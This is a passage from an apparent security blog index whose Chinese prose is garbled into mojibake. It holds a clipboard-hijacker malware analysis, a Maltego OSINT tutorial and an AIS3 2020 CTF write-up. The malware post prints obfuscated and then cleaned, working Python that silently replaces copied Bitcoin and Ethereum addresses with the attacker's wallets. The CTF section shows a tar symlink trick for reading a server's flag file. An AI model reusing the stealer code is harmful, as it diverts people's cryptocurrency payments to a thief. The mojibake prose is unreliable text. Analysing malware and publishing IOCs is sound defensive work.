class="line">        o0OO00 = str().join([ chr(ord(oo) - ii - (i1iII1IiiIiI1 + o0O) % oOOo) <span class="keyword">for</span> i1iII1IiiIiI1, oo <span class="keyword">in</span> enumerate(iIIii1IIi) ])</span><br><span class="line">    <span class="keyword">return</span> eval(o0OO00)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time, re, pyperclip, subprocess</span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">    ooOoO0O00 * IIiIiII11i</span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">    oOo0O0Ooo * I1ii11iIi11i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">I1IiI</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            o0OOO = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">                ooOo + Oo</span><br><span class="line">            o0OIiiIII111iI = subprocess.Popen([<span class="string">'C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'</span>, <span class="string">'Get-Clipboard'</span>], stdout=subprocess.PIPE, startupinfo=IiII)</span><br><span class="line">            o0OOO = str(o0OIiiIII111iI.stdout.read()).strip().decode(<span class="string">'utf-8'</span>).rstrip(<span class="string">u'\x00'</span>)</span><br><span class="line">            <span class="keyword">if</span> o0OOO != iI1Ii11111iIi <span class="keyword">and</span> o0OOO != i1i1II:</span><br><span class="line">                <span class="keyword">if</span> re.match(O0oo0OO0, str(o0OOO)):</span><br><span class="line">                    pyperclip.copy(iI1Ii11111iIi)</span><br><span class="line">                    pyperclip.paste()</span><br><span class="line">                <span class="keyword">elif</span> re.match(I1i1iiI1, str(o0OOO)):</span><br><span class="line">                    pyperclip.copy(i1i1II)</span><br><span class="line">                    pyperclip.paste()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> iiIIIII1i1iI:</span><br><span class="line">            print(iiIIIII1i1iI)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">            o00ooo0 / Oo00O0</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == O0(<span class="string">u'\u0829\u0862\u0863\u0872\u0867\u0869\u086f\u0861\u0862\u082b\u0805'</span>):</span><br><span class="line">    i1i1II = <span class="string">'0x22f338FC26Ea71EC884256C29103122c4578EE27'</span></span><br><span class="line">    iI1Ii11111iIi = <span class="string">'14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS'</span></span><br><span class="line">    O0oo0OO0 = <span class="string">'^[13][a-km-zA-HJ-NP-Z1-9]&#123;25,34&#125;$'</span></span><br><span class="line">    I1i1iiI1 = <span class="string">'^(0x)?[0-9a-fA-F]&#123;40&#125;$'</span></span><br><span class="line">    time.sleep(<span class="number">15</span>)</span><br><span class="line">    IiII = subprocess.STARTUPINFO()</span><br><span class="line">    IiII.dwFlags |= subprocess.STARTF_USESHOWWINDOW</span><br><span class="line">    I1IiI()</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">        o0oooOoO0</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">        IiIii1Ii1IIi / O0Oooo00.oo00 * I11</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">        I1111 * o0o0Oo0oooo0 / I1I1i1 * oO0 / IIIi1i1I</span><br><span class="line"><span class="comment"># okay decompiling 8.61.py.pyc</span></span><br></pre></td></tr></table></figure>
<p>æœ‰ç¨å¾®æ··æ·†éçš„åŸå§‹ç¢¼ï¼Œé‡æ–°å‘½åä¸€ä¸‹è®Šæ•¸å°±å¯ä»¥äº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> time, re, pyperclip, subprocess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            clipboard = <span class="literal">None</span></span><br><span class="line">            process = subprocess.Popen([<span class="string">'C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'</span>, <span class="string">'Get-Clipboard'</span>], stdout=subprocess.PIPE, startupinfo=startupinfo)</span><br><span class="line">            clipboard = str(process.stdout.read()).strip().decode(<span class="string">'utf-8'</span>).rstrip(<span class="string">u'\x00'</span>)</span><br><span class="line">            <span class="keyword">if</span> clipboard != btc_address <span class="keyword">and</span> clipboard != eth_address:</span><br><span class="line">                <span class="keyword">if</span> re.match(btc_address_pattern, str(clipboard)):</span><br><span class="line">                    pyperclip.copy(btc_address)</span><br><span class="line">                    pyperclip.paste()</span><br><span class="line">                <span class="keyword">elif</span> re.match(eth_address_pattern, str(clipboard)):</span><br><span class="line">                    pyperclip.copy(eth_address)</span><br><span class="line">                    pyperclip.paste()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            print(err)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    eth_address = <span class="string">'0x22f338FC26Ea71EC884256C29103122c4578EE27'</span></span><br><span class="line">    btc_address = <span class="string">'14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS'</span></span><br><span class="line">    btc_address_pattern = <span class="string">'^[13][a-km-zA-HJ-NP-Z1-9]&#123;25,34&#125;$'</span></span><br><span class="line">    eth_address_pattern = <span class="string">'^(0x)?[0-9a-fA-F]&#123;40&#125;$'</span></span><br><span class="line">    time.sleep(<span class="number">15</span>)</span><br><span class="line">    startupinfo = subprocess.STARTUPINFO()</span><br><span class="line">    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>ä»–æŠŠä½ å‰ªè²¼ç°¿è£¡é¢ç¬¦åˆ bitcoin æˆ– ethereum åœ°å€æ ¼å¼çš„é€šé€šæ›æˆä»–éŒ¢åŒ…çš„ä½å€ã€‚</p>
<h2 id="IOC"><a class="header-anchor" href="#IOC"></a>IOC</h2>
<ul>
<li>0x22f338FC26Ea71EC884256C29103122c4578EE27</li>
<li>14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS</li>
</ul>

        </div>
        
        
        <div class="level is-mobile readmore-button">
            <div class="level-start">
                <div class="level-item">
                <a class="button is-size-7 is-light" href="/2020/08/16/security/news/clipboard-hijack/#more">Read More</a>
                </div>
            </div>
        </div>
        
        
    </div>
</div>








    
<div class="card card-readmore">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2020-07-30T16:29:25.000Z">2020-07-31</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/security/">security</a>&nbsp;/&nbsp;<a class="has-link-grey -link" href="/categories/security/osint/">osint</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    4 minutes read (About 625 words)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2020/07/31/security/osint/maltego/">ã€å°å·¥å…·ã€‘Maltego</a>
            
        </h1>
        <div class="content">
            <p>Maltego æ˜¯ç”¨ä¾†è‡ªå‹•åŒ–æƒ…è³‡è’é›†çš„å·¥å…·ã€‚</p>
<h2 id="åŸºæœ¬ä»‹ç´¹"><a class="header-anchor" href="#åŸºæœ¬ä»‹ç´¹"></a>åŸºæœ¬ä»‹ç´¹</h2>
<p>ä¸€é–‹å§‹å°±æŒ‰ Creat a new graph æ–°å¢ä¸€å€‹å·¥ä½œçš„åœ–å±¤ï¼Œå°±å¯ä»¥åœ¨ä¸Šé¢ç•«å‡ºé—œä¿‚åœ–ã€‚</p>
<p>Entities æ˜¯åŸºæœ¬ç‰©ä»¶ï¼Œæœ‰å¾ˆå¤šç¨®é¡å‹æ¯”å¦‚ Company, Organization, Domain, Website, â€¦ï¼Œæ¯å€‹ç‰©ä»¶éƒ½æœ‰å¹¾å€‹å±¬æ€§æ¬„ä½ï¼Œå‡è¨­ä½ æ‹¿åˆ°æŸå€‹äººçš„æ‰‹æ©Ÿè™Ÿç¢¼ï¼Œé‚£å¯ä»¥å¾æ—é‚Š Entity Palette æ‹–æ›³ä¸€å€‹ Phone Number åˆ°å³é‚Šç©ºç™½è™•ã€‚</p>
<p>Transforms å°±æ˜¯ä¸€å€‹å¯ä»¥é‡è¤‡ä½¿ç”¨çš„å‡½å¼ï¼Œæ¯”å¦‚å·²ç¶“æœ‰äº†æ‰‹æ©Ÿè™Ÿç¢¼ï¼Œé‚£å°±å»æŸå€‹ç¶²ç«™ä¸Šçˆ¬æ‰‹æ©Ÿè™Ÿç¢¼å°æ‡‰çš„åœ‹å®¶ä¹‹é¡çš„ï¼ŒæŠŠé€™å€‹çˆ¬çš„æ­¥é©Ÿå¯«æˆä¸€å€‹ transformï¼Œå°±å¯ä»¥è‡ªå‹•åŒ–å»å¾å·²çŸ¥çš„è³‡æ–™ç”Ÿæ›´å¤šç›¸é—œçš„è³‡æ–™ã€‚Local Transform æ˜¯è‡ªå·±å¯«çš„å‡½å¼ï¼Œä¹Ÿæœ‰åˆ¥äººå¯«å¥½çš„åœ¨ Transform Hub ä¸Šé¢ã€‚</p>
<h2 id="Local-Transforms"><a class="header-anchor" href="#Local-Transforms"></a>Local Transforms</h2>
<p>è·Ÿè‘—å®˜æ–¹æ–‡ä»¶ <a href="https://docs.maltego.com/support/solutions/articles/15000017605-local-transforms-example-">maltego docs</a> åšå°±å¯ä»¥å¤§æ¦‚äº†è§£æ€éº¼ç”¨ python å»å¯« Local Transforms äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install maltego-trx</span><br><span class="line">maltego-trx start new_project</span><br></pre></td></tr></table></figure>
<p>å…ˆå®‰è£ python å¥—ä»¶ï¼Œå†ç”¨ <code>maltego-trx</code> å»åˆå§‹åŒ–ä¸€å€‹ project</p>
<figure class="highlight python"><figcaption><span>transforms/TaxIDToCompany.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> maltego_trx.entities <span class="keyword">import</span> Person</span><br><span class="line"><span class="keyword">from</span> maltego_trx.transform <span class="keyword">import</span> DiscoverableTransform</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaxIDToCompany</span><span class="params">(DiscoverableTransform)</span>:</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_entities</span><span class="params">(cls, request, response)</span>:</span></span><br><span class="line">        taxid = request.Properties[<span class="string">'properties.taxid'</span>]</span><br><span class="line">        r = requests.get(<span class="string">f'http://company.g0v.ronny.tw/api/show/<span class="subst">&#123;taxid&#125;</span>'</span>)</span><br><span class="line">        result = json.loads(r.text)</span><br><span class="line">        response.addEntity(<span class="string">'maltego.Company'</span>, result[<span class="string">'data'</span>][<span class="string">'å…¬å¸åç¨±'</span>])</span><br></pre></td></tr></table></figure>
<p>ä¸»è¦å°±æ˜¯ç¹¼æ‰¿ <code>DiscoverableTransform</code> ç„¶å¾Œå¡«å¯« <code>create_entities</code> é€™å€‹å‡½å¼ï¼Œrequest è£¡é¢å°±æœ‰åŸ·è¡Œ transform çš„é‚£å€‹ entity çš„è³‡è¨Šï¼Œç„¶å¾Œé€™è£¡æ˜¯ç”¨çµ±ä¸€ç·¨è™Ÿ ( TaxID ) å»æ‰¾å…¬å¸åç¨±ï¼Œç„¶å¾Œæ–°å¢ä¸€å€‹å…¬å¸çš„ Entityã€‚<br>
åŸæœ¬æ²’æœ‰ TaxID é€™å€‹ Entity è¦å…ˆå» New Entity Type æ–°å¢ä¸€å€‹ TaxIDã€‚<br>
<code>company.g0v.ronny.tw</code> å›å‚³çš„è³‡è¨Šæœ‰å¾ˆå¤šï¼Œå¯ä»¥æŠŠé‚£äº›è³‡è¨Šéƒ½åŠ é€²ä¾†ï¼Œå¯æ˜¯æˆ‘å°±æ‡¶ã€‚</p>
<p>å¯«å®Œä¹‹å¾Œè¦æŠŠ Local Transform åŠ é€²å»ï¼Œæœ‰å¹¾å€‹æ¬„ä½è¦æ³¨æ„ï¼Œ</p>
<ol>
<li>Input entity type : è¦å¡«é€™å€‹ transform è¦å°å“ªä¸€ç¨® entity åšæ“ä½œ</li>
<li>Command : æˆ‘å€‘æ˜¯ç”¨ python api æ‰€ä»¥è¦å¡« python çš„ PATHï¼Œåœ¨ linux ä¸Šå¯ä»¥ç”¨ <code>which python</code> æ‰¾</li>
<li>Parameters : å¡« <code>project.py local TaxIDToCompany</code>ï¼Œ<code>project.py</code> æ˜¯åˆå§‹åŒ– project å®Œæœƒç”¢ç”Ÿçš„è…³æœ¬ï¼Œ<code>local</code> æŒ‡çš„å°±æ˜¯ Local Transformï¼Œ<code>TaxIDToCompany</code> æ˜¯ä½  transform çš„åå­—ï¼Œå°±æ˜¯é‚£å€‹æª”åçš„éƒ¨åˆ†å§</li>
<li>Working directory: Project çš„è·¯å¾‘ï¼Œå°±æ˜¯è¦æœ‰ <code>project.py</code> çš„é‚£å€‹åœ°æ–¹</li>
</ol>
<p>æœ€å¾ŒæŒ‰ä¸‹ Run è·‘å®Œ transform ä¹‹å¾Œï¼Œå°±æœƒè‡ªå‹•æ–°å¢ä¸€å€‹ Company çš„ Entityã€‚</p>
<p align="center"><img data-src="/images/maltego-result.png" class=" lazyload"  title="maltego result"></p>
        </div>
        
        
        <div class="level is-mobile readmore-button">
            <div class="level-start">
                <div class="level-item">
                <a class="button is-size-7 is-light" href="/2020/07/31/security/osint/maltego/#more">Read More</a>
                </div>
            </div>
        </div>
        
        
    </div>
</div>








    
<div class="card card-readmore">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2020-06-09T14:29:00.000Z">2020-06-09</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/security/">security</a>&nbsp;/&nbsp;<a class="has-link-grey -link" href="/categories/security/writeups/">writeups</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    39 minutes read (About 5870 words)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2020/06/09/security/writeups/ais3-2020-preexam/">ã€Writeupsã€‘AIS3 pre-exam 2020</a>
            
        </h1>
        <div class="content">
            <p>é€™å­¸æœŸä¿®äº†ç¶²è·¯æ”»é˜²å¯¦ç¿’ï¼Œé€™å ‚èª²è¦ç”¨ AIS3 Pre-Exam ç•¶æœŸæœ«è€ƒï¼Œå¥½å–”ã€‚</p>
<p align="center"><img data-src="/images/ais3-scores.png" class=" lazyload"  width="500" title="AIS3 Pre-Exam Scores"></p>
<p><a href="https://github.com/OAlienO/CTF/tree/master/2020/AIS3-pre-exam">æ”»æ“Šè…³æœ¬å€‘åœ¨é€™</a></p>
<h2 id="Misc"><a class="header-anchor" href="#Misc"></a>Misc</h2>
<h3 id="Piquero"><a class="header-anchor" href="#Piquero"></a>Piquero</h3>
<p>é€™é¡Œçµ¦äº†ä¸€å¼µé»å­—çš„åœ–ï¼Œåªè¦å…ˆæ‰¾åˆ°å‡ºé¡Œè€…ç”¨çš„ generator <a href="https://www.mathsisfun.com/braille-translation.html">é€™å€‹</a>ï¼Œæ¥è‘—å°±ä¸€å€‹ä¸€å€‹å°ç…§å°±è§£å‡ºä¾†äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;I_feel_sleepy_Good_Night!!!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Karuego"><a class="header-anchor" href="#Karuego"></a>Karuego</h3>
<p>é€™é¡Œçµ¦äº†ä¸€å¼µ pngï¼Œå…ˆç”¨ <code>binwalk --dd=&quot;.*&quot; Karuego.png</code> æ‹‰å‡ºä¸€å€‹ zip æª”ï¼Œé€™å€‹ zip æª”æœ‰åŠ å¯†ï¼ŒåŸæœ¬æƒ³ç”¨ <code>fcrackzip</code> ä¹‹é¡çš„çˆ†ç ´å·¥å…·ï¼Œä½† <code>zsteg -a Karuego.png</code> ä¸‹å»ç™¼ç¾ LSB æœ‰ä¸€æ®µæ–‡å­— <code>The key is : lafire</code>ï¼Œzip æª”è§£é–‹è£¡é¢æœ‰ä¸€å¼µ <code>Demon.png</code> æ‰“é–‹å°±çœ‹åˆ° flag äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Ar3_y0u_r34l1y_r34dy_t0_sumnn0n_4_D3m0n?&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Soy"><a class="header-anchor" href="#Soy"></a>Soy</h3>
<p>é€™é¡Œçµ¦äº†ä¸€å¼µ pngï¼Œæ˜¯è¢«å¢¨æ¼¬æ±¡æŸ“çš„ QR Codeï¼Œæˆ‘ç”¨ <code>https://merricx.github.io/qrazybox/</code> æŠŠå·²çŸ¥çš„é»‘é»ç™½é»éƒ½ç•«äº†ä¸Šå»å°±è§£å‡ºä¾†äº†ï¼Œå› ç‚ºå¤§éƒ¨åˆ†çš„ Data å€å¡Šéƒ½æ²’è¢«æ±¡æŸ“åˆ°å§ï¼Œé€™å€‹ç¶²ç«™ä¸Šç•« QR Code çš„æ™‚å€™è¨˜å¾—è¦ç•«ç™½é»ï¼Œä¸è¦åªç•«é»‘é»ï¼Œæ²’ç•«çš„æœƒæ˜¯æœªçŸ¥çš„ç°é»ï¼Œæˆ‘åœ¨é€™è£¡å¡å¾ˆä¹…Q</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;H0w_c4n_y0u_f1nd_me?!?!?!!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Saburo"><a class="header-anchor" href="#Saburo"></a>Saburo</h3>
<p>é€™é¡Œè¦ <code>nc 60.250.197.227 11001</code>ï¼Œæ²’çµ¦åŸå§‹ç¢¼ï¼Œé€£ä¸Šå»è¦è¼¸å…¥ flag çµ¦ä»–ï¼Œä»–æœƒè¼¸å‡ºä½ å¹¾ç§’å¾Œè¼¸äº†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Flag: A</span><br><span class="line">Haha, you lose in 24 milliseconds.</span><br></pre></td></tr></table></figure>
<p>çŒœæ¸¬æ˜¯ Side Channel Attackï¼ŒåŸå§‹ç¢¼çŒœæ¸¬å¤§æ¦‚æ˜¯ ( ä¸è² è²¬ä»»äº‚å¯« code å¦‚ä¸‹ )</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compare</span><span class="params">(real_flag, user_flag)</span>:</span></span><br><span class="line">    l = len(user_flag) <span class="keyword">if</span> len(user_flag) &lt; len(real_flag) <span class="keyword">else</span> len(real_flag)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(user_flag)):</span><br><span class="line">        <span class="keyword">if</span> user_flag[i] != real_flag[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> i == len(user_flag) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">real_flag = <span class="string">'AIS3&#123;...&#125;'</span></span><br><span class="line">user_flag = input()</span><br><span class="line"></span><br><span class="line">start = time.clock()</span><br><span class="line">win = compare(real_flag, user_flag)</span><br><span class="line">end = time.clock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> win:</span><br><span class="line">    print(<span class="string">f'Haha, you lose in <span class="subst">&#123;end - start&#125;</span> milliseconds.'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">f'Oh, you win. QQ'</span>)</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯å¾ˆå¤šäººåœ¨é€£ç·šçš„æ™‚å€™å»ç®— cpu time æœƒæŠ–çš„å¾ˆå¤§åŠ›ï¼Œæ‰€ä»¥å¾Œä¾† server æ‡‰è©²æ˜¯æ”¹æˆç”¨æ¨¡æ“¬çš„ ( å°±æ¯”è¼ƒç©©äº† )ï¼Œå°±æ˜¯éŒ¯äº†å°±åŠ å€‹ random å° noiseï¼Œå°äº†å°±åŠ ä¸€å€‹å¤§ä¸€é»çš„å€¼ä¹‹é¡çš„ã€‚</p>
<p>æ‰€ä»¥æ¯å€‹å­—éƒ½çˆ†æœ 0 - 255ï¼Œç„¶å¾Œå–æœ€å¤§çš„å°±å¥½äº†ï¼Œå¯ä»¥æ¯æ¬¡å˜—è©¦éƒ½é€å€‹åæ¬¡å–å¹³å‡ä¹‹é¡çš„ï¼Œæˆ–æ˜¯æŠŠ log è¨˜èµ·ä¾†ï¼Œä¹‹å¾Œå¦‚æœçˆ†æœæ‰€æœ‰ byte éƒ½æ²’æœ‰é€²å±•çš„è©±å°±ï¼Œå›å»æ‰¾ç¬¬äºŒé«˜çš„ï¼Œæœƒæ¯”è¼ƒç©©ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;A1r1ght_U_4r3_my_3n3nnies&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Shichirou"><a class="header-anchor" href="#Shichirou"></a>Shichirou</h3>
<p>é€™é¡Œè¦ <code>nc 60.250.197.227 11000</code>ï¼Œæœ‰çµ¦åŸå§‹ç¢¼ï¼Œçµ¦ä»–ä¸€å€‹ tar æª”ï¼Œä»–å¹«ä½ è§£é–‹ç„¶å¾ŒæŠŠè§£é–‹çš„ <code>guess.txt</code> è·Ÿ local çš„ <code>flag.txt</code> çš„ sha1 åšæ¯”è¼ƒï¼Œå¦‚æœä¸€æ¨£çš„è©±å°±å™´ flagã€‚<br>
tar å¯ä»¥å£“ç¸® symbolic linkï¼Œè‡ªå·±åšä¸€å€‹ symbolic link æŒ‡å‘ <code>flag.txt</code> å°±å®Œæˆäº†ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s ../flag.txt guess.txt</span><br><span class="line">tar -cf test.tar ./</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Bu223r!!!!_I_c4n_s33_e_v_e_r_y_th1ng!!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Clara"><a class="header-anchor" href="#Clara"></a>Clara</h3>
<p>é€™é¡Œçµ¦äº†ä¸€å€‹ pcap æª”ï¼Œä¸€é–‹å§‹å•¥æç¤ºéƒ½æ²’æœ‰ï¼Œå¾Œä¾†æœ‰èªªæ˜¯ Malware åœ¨ monitor é›»è…¦ç„¶å¾Œå‚³ encrypted data çµ¦ C&amp;C Serverï¼Œç„¶å¾Œå‚³äº†å…©æ¬¡ä¸€æ¨£çš„è³‡æ–™ï¼Œçœ‹äº†è€åŠå¤©ï¼Œæœƒç™¼ç¾ tcp æµé‡è£¡é¢æœ‰é¡ä¼¼ AIS3 çš„å­—æ¨£ï¼Œæœ‰å…©å¤§åŒ… tcpï¼Œä¸€åŒ… 10 MB å¦ä¸€åŒ… 27 MBï¼ŒåŠ å¯†çš„è©±å¤§æ¦‚ä¹Ÿåªæœ‰ xor æ¯”è¼ƒæ­£å¸¸å§ï¼Œæ‰€ä»¥è¤‡è£½äº†ä¸€äº›éƒ¨åˆ†ç”¨ <code>xortool</code> åˆ†æï¼Œæ‰¾åˆ° key æ˜¯ <code>AIS3{NO}</code>ï¼Œè€Œä¸”çœ‹åˆ° PNG é–‹é ­çš„å­—æ¨£å’Œä¸€äº› xml çš„ meta dataï¼Œå°±å¯ä»¥ç¢ºå®šå‡è¨­æ­£ç¢ºä¹Ÿè§£å°äº†(æ±—ï¼Œæ—¢ç„¶å…©æ¬¡åŒ…çš„æ˜æ–‡æ˜¯ä¸€æ¨£çš„é‚£å°±æŠŠå…©åŒ…åš xor å† xor ä¸Š <code>AIS3{NO}</code> å°±å¾—åˆ°å¦ä¸€åŒ…çš„ key æ˜¯ <code>xSECRETx</code>ï¼Œæ¥è‘—æŠŠæ•´åŒ…æ‹¿å»åš xor æ‹‰å‡ºåœ–ç‰‡ï¼Œåœ–ç‰‡æœ‰å¥½å¹¾ MB å¾ˆå¤§ï¼Œä¸€é–‹å§‹åªæœ‰æ‹‰å‡ºä¸€å¼µåœ–ç‰‡ï¼ŒæŸå€‹å‹•æ¼«çš„åœ–ï¼Œåˆå¡äº†ä¸€ä¸‹å¾Œï¼Œç™¼ç¾é‚£åŒ…å‰é¢çš„éƒ¨åˆ†æœ‰é¡ä¼¼ header çš„æ±è¥¿ï¼Œä»–ä¸æ˜¯ 8 çš„å€æ•¸ï¼Œæˆ‘ä¸€é–‹å§‹æ˜¯ç›´æ¥ä¸ç†ä»–ï¼Œä½†æ˜¯çŒœæ¸¬å¾Œé¢ä¹Ÿæœ‰å¥½å¹¾æ®µ headerï¼Œè®“ xor æ²’å°é½Šå£æ‰ï¼Œæ‰€ä»¥æˆ‘å°±æŠŠæ•´æ®µ data æš´åŠ› shift äº†å¹¾æ¬¡æ‹¿å» xorï¼Œå°±æ‹‰å‡ºæ‰€æœ‰ç…§ç‰‡äº†ï¼Œå…¶ä¸­ä¸€å¼µæœ‰ flagï¼Œå…¶ä»–éƒ½åƒåœ¾ï¼ŒåŸæœ¬ä¸çŸ¥é“æœ‰å¾ˆå¤šå¼µåœ–ç‰‡ï¼Œä¹Ÿä¸çŸ¥é“ flag åœ¨å“ªçš„æ™‚å€™é‚„åœ¨é–‹ <code>stegsolve</code> å’Œ <code>zsteg</code> åœ¨åœ–ç‰‡æ‰¾ flagï¼Œæµªè²»å¾ˆå¤šæ™‚é–“ã€‚<br>
ä»–çš„ packet æ˜¯å¾ˆæœ‰ç§©åºæ²’æœ‰äº‚å‚³çš„ï¼Œheader è£¡é¢å°±æ˜¯å›ºå®šå‚³ä¸€å€‹ <code>0xdeadbeeffaceb00c</code> ç„¶å¾Œ C&amp;C æŠŠå‰›å‰›é‚£æ®µ xor åŠ å¯†å›å‚³ï¼Œæ¥è‘—å¾Œé¢æª”æ¡ˆåå­—çš„å¤§å°ï¼Œå’Œæª”æ¡ˆåå­—ï¼Œæ¯å€‹éƒ½åˆ†é–‹å‚³ï¼Œæ¯å€‹éƒ½è‡ªå·±åš xor cipherï¼Œæ¥è‘—å°±æ˜¯å‚³ dataï¼Œéƒ½æ²’æœ‰èµ°æ­ªæˆ–æ˜¯æ‰é€²ä»€éº¼å‘çš„è©±é‚„æ˜¯æœ‰æ©Ÿæœƒè§£å‡ºä¾†çš„ï¼Œæˆ‘ä¹Ÿä¸å¸¸åˆ†æ packet ä¹Ÿæ²’åˆ†æéä»€éº¼æƒ¡æ„ç¨‹å¼ï¼Œç¶“é©—ä¸è¶³æ‰€ä»¥è§£å¾ˆä¹…é‚„è¦çœ‹ hint QQ</p>
